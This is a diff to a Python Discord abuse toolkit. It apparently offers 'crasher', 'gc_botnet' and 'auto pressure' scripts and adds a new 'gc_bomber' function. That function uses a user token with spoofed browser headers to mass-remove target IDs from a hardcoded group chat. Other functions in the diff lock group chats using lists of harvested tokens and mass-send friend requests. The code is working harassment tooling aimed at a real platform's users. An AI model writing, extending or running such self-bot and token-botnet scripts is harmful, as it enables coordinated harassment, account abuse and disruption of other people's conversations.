@@ -8,16 +8,21 @@ import random, os, sys, json, time, pyperclip, requests, asyncio, base64
 # -------- Import Artwork -------- #
 
 dashboard = open('lists/artwork/dashboard.txt', encoding='utf-8').read()
+
 dashboard_afk_check = open('lists/artwork/dashboard_afk_check.txt', encoding='utf-8').read()
 dashboard_afk_alert = open('lists/artwork/dashboard_afk_alert.txt', encoding='utf-8').read()
 dashboard_auto_pressure = open('lists/artwork/dashboard_auto_pressure.txt', encoding='utf-8').read()
 dashboard_options = open('lists/artwork/dashboard_options.txt', encoding='utf-8').read()
+
 dashboard_packgen = open('lists/artwork/dashboard_packgen.txt', encoding='utf-8').read()
 dashboard_topicgen = open('lists/artwork/dashboard_topicgen.txt', encoding='utf-8').read()
 dashboard_anti_packgen = open('lists/artwork/dashboard_anti_packgen.txt', encoding='utf-8').read()
+
 dashboard_crasher = open('lists/artwork/dashboard_crasher.txt', encoding='utf-8').read()
+
 dashboard_gc_botnet = open('lists/artwork/dashboard_gc_botnet.txt', encoding='utf-8').read()
 dashboard_add_users = open('lists/artwork/dashboard_add_users.txt', encoding='utf-8').read()
+dashboard_gc_bomber = open('lists/artwork/dashboard_gc_bomber.txt', encoding='utf-8').read()
 
 # -------- Import Artwork -------- #
 
@@ -67,7 +72,7 @@ def startup():
     clear_screen()
     print(dashboard)
     print(dashboard_options)
-    script_choice = input('\nWhat script would you like to run? 1/2/3/4/5/6/7/8/9: ')
+    script_choice = input('\nWhat script would you like to run? 1/2/3/4/5/6/7/8/9/10: ')
     match script_choice:
       case '1':
         auto_pressure()
@@ -95,6 +100,9 @@ def startup():
 
       case '9':
         add_users()
+
+      case '10':
+        gc_bomber()
 
       case _:
         startup()
@@ -572,15 +580,13 @@ def gc_botnet():
         case True:
           channel = int(input(f'{front} Group ID: '))
           token = settings.get('token')
-          delay = int(input(f'{front} Delay: '))
         
         case False:
           channel = settings.get('channel')
           token = settings.get('token')
-          delay = settings.get('delay')
 
       ids = open('lists/gc_locker/gc_botnet.txt').readlines()
-      tokens = open('lists/gc_locker/gc_tokens.txt').raedlines()
+      tokens = open('lists/gc_locker/gc_tokens.txt').readlines()
 
       num_lines = len(ids) # numl
 
@@ -601,11 +607,15 @@ def gc_botnet():
             case 401:
               print(f'{front} Invalid token or group ID')
 
-            case _:
-              print(f'{front} {gc_locker_put_request.status_code}')
+            case 403:
+              print(f'{front} User not added as a friend')
 
-          time.sleep(delay)
+            case _:
+              print(f'{front} Unknown status code, report this code to byte#6110 | Code:  {gc_locker_put_request.status_code}')
+
           i += 1
+      input(f'{front} Locker done, press enter to return to main menu.')
+      startup()
 
     except KeyboardInterrupt:
         startup()
@@ -619,23 +629,22 @@ def add_users():
     ids = open('lists/gc_locker/gc_botnet.txt').readlines()
 
     for id in ids:
-        add_users_put_url = f"https://discord.com/api/v9/users/@me/relationships/{id.strip()}"
+        add_users_put_url = f'https://discord.com/api/v9/users/@me/relationships/{id.strip()}'
         add_users_headers = {
-            "accept": "*/*",
-            "accept-language": "en-GB",
-            "authorization": token,
-            "content-type": "application/json",
-            "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "x-context-properties": "eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9",
-            "x-debug-options": "bugReporterEnabled",
-            "x-discord-locale": "en-US",
-            "x-super-properties": "eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkRpc2NvcmQgQ2xpZW50IiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X3ZlcnNpb24iOiIwLjAuMjQiLCJvc192ZXJzaW9uIjoiNi4xLjYtYXJjaDEtMyIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tR0IiLCJ3aW5kb3dfbWFuYWdlciI6IktERSx1bmtub3duIiwiZGlzdHJvIjoiXCJYZXJvTGludXhcIiIsImNsaWVudF9idWlsZF9udW1iZXIiOjE2OTE3OCwibmF0aXZlX2J1aWxkX251bWJlciI6bnVsbCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
-        }
+            'accept': '*/*',
+            'accept-language': 'en-GB',
+            'authorization': token,
+            'content-type': 'application/json',
+            'sec-ch-ua': '\' Not A;Brand\';v=\'99\', \'Chromium\';v=\'102\'',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '\'Linux\'',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
+            'x-debug-options': 'bugReporterEnabled',
+            'x-discord-locale': 'en-US'
+            }
 
         body = {}
 
@@ -657,11 +666,75 @@ def add_users():
           case _:
             print(f'{front} Unknown status code, report this code to byte#6110 | Code: {add_users_put_request.status_code}')
       
+    input(f'{front} Adder done, press enter to return to main menu.')
     startup()
 
   except KeyboardInterrupt:
     startup()
 
+def gc_bomber():
+  try:
+    clear_screen()
+    print(dashboard_gc_bomber)
+    match live_mode:
+      case True:
+        channel = int(input(f'{front} Group ID: '))
+
+        token = settings.get('token')
+      case False:
+        channel = settings.get('channel')
+        token = settings.get('token')
+
+    ids = open('lists/gc_bomber/gc_bomber_targets.txt').readlines()
+
+    for id in ids:
+
+
+      gc_bomber_url = f'https://discord.com/api/v9/channels/1065898767376723968/recipients/{id.strip()}'
+      gc_bomber_headers = {
+          'accept': '*/*',
+          'accept-language': 'en-GB',
+          'authorization': token,
+          'sec-ch-ua': '\' Not A;Brand\';v=\'99\', \'Chromium\';v=\'102\'',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '\'Linux\'',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'same-origin',
+          'x-debug-options': 'bugReporterEnabled',
+          'x-discord-locale': 'en-US'
+          }
+
+      removed = 1
+
+      gc_bomber_delete_request = requests.delete(gc_bomber_url, headers=gc_bomber_headers)
+
+      match gc_bomber_delete_request.status_code:
+          case 204:
+            print(f'{front} Removed {removed}')
+            removed+1
+
+          case 400:
+            print(f'{front} Already removed this ID, {id}')
+
+          case 429:
+              print(f'{front} Being ratelimited')
+
+          case 401:
+              print(f'{front} Invalid token or user ID')
+
+          case 403:
+              print(f'{front} User not in group')
+
+          case _:
+            print(f'{front} Unknown status code, report this code to byte#6110 | Code: {gc_bomber_delete_request.status_code}')
+
+    input(f'{front} Bomber done, press enter to return to main menu.')
+    startup()
+
+
+  except KeyboardInterrupt:
+    startup()
 
 
 # -------- Scripts -------- #
